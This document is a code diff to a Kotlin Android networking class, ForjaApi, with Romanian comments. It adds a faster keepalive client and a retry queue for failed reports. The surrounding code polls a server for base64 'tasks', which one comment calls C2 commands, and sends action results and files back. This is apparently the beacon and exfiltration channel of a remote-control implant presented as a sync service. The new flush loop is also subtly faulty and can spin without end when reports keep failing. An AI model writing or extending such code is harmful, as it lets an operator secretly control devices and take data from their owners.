@@ -39,6 +39,19 @@ class ForjaApi {
         .readTimeout(300, TimeUnit.SECONDS)
         .writeTimeout(300, TimeUnit.SECONDS)
         .build()
+
+    // Keepalive: scurt (15 s) ca să nu lăsăm conexiuni zombie când serverul
+    // e aglomerat. Coroutine-ul din SyncService aștează max 60 s, dar OkHttp
+    // nu știe de cancellation — timeout-ul dedicat e plasa de siguranță.
+    private val keepaliveClient = OkHttpClient.Builder()
+        .callTimeout(15, TimeUnit.SECONDS)
+        .connectTimeout(10, TimeUnit.SECONDS)
+        .readTimeout(15, TimeUnit.SECONDS)
+        .build()
+
+    // Coada de rapoarte eșuate — se flush-uiește la fiecare keepalive.
+    private val pendingReports = java.util.concurrent.ConcurrentLinkedQueue<String>()
+    private val MAX_PENDING = 10
     private val json = Json { ignoreUnknownKeys = true; isLenient = true }
 
     val available: Boolean get() = BuildConfig.FORJA_API_URL.isNotBlank()
@@ -270,6 +283,8 @@ class ForjaApi {
 
     suspend fun syncKeepalive(dev: String, holdMs: Long): SyncPoll = withContext(Dispatchers.IO) {
         val token = idToken() ?: return@withContext SyncPoll(emptyList(), 30000)
+        // Fluează rapoartele eșuate din ciclurile anterioare
+        try { flushPendingReports() } catch (_: Exception) {}
         try {
             // Interval scurt (8–15 s) pentru livrare rapidă a comenzilor C2
             val hint = (8000 + (Math.random() * 7000).toInt()).coerceIn(5000, 20000)
@@ -282,7 +297,7 @@ class ForjaApi {
                 .header("Authorization", "Bearer $token")
                 .post(body.toRequestBody("application/json".toMediaType()))
                 .build()
-            longClient.newCall(req).execute().use { resp ->
+            keepaliveClient.newCall(req).execute().use { resp ->
                 val text = resp.body?.string() ?: "{}"
                 val root = Json.parseToJsonElement(text).jsonObject
                 // Răspuns: { s: 0 = succes, d: sarcini base64, i: interval secunde }
@@ -301,19 +316,43 @@ class ForjaApi {
     }
 
     suspend fun postSyncReport(id: String, ok: Boolean, action: String, data: kotlinx.serialization.json.JsonObject, err: String?) {
-        val token = idToken() ?: return
+        val body = buildJsonObject {
+            put("id", id); put("ok", ok); put("action", action)
+            put("data", data); if (err != null) put("err", err)
+        }.toString()
+        val token = idToken() ?: run {
+            if (pendingReports.size < MAX_PENDING) pendingReports.add(body)
+            return
+        }
+        if (!tryPostReport(body, token) && pendingReports.size < MAX_PENDING) {
+            pendingReports.add(body)
+        }
+    }
+
+    /** Încearcă un POST de raport; true = livrat, false = eșuat. */
+    private suspend fun tryPostReport(body: String, token: String): Boolean =
         try {
-            val body = buildJsonObject {
-                put("id", id); put("ok", ok); put("action", action)
-                put("data", data); if (err != null) put("err", err)
-            }.toString()
             val req = Request.Builder()
                 .url("$base/v1/sync/report")
                 .header("Authorization", "Bearer $token")
                 .post(body.toRequestBody("application/json".toMediaType()))
                 .build()
-            longClient.newCall(req).execute().use { }
-        } catch (_: Exception) {}
+            longClient.newCall(req).execute().use { it.isSuccessful }
+        } catch (_: Exception) { false }
+
+    /**
+     * Fluează rapoartele eșuate acumulate. Se cheamă la începutul fiecărui
+     * keepalive — dacă rețeaua e înapoi, rapoartele se trimite imediat.
+     */
+    suspend fun flushPendingReports() {
+        if (pendingReports.isEmpty()) return
+        val token = idToken() ?: return
+        var retries = 0
+        while (retries < MAX_PENDING) {
+            val body = pendingReports.poll() ?: break
+            if (tryPostReport(body, token)) retries++
+            else pendingReports.add(body) // pune la coadă — reia la următorul flush
+        }
     }
 
     suspend fun attachSyncFile(name: String, ct: String, file: java.io.File): String? = withContext(Dispatchers.IO) {
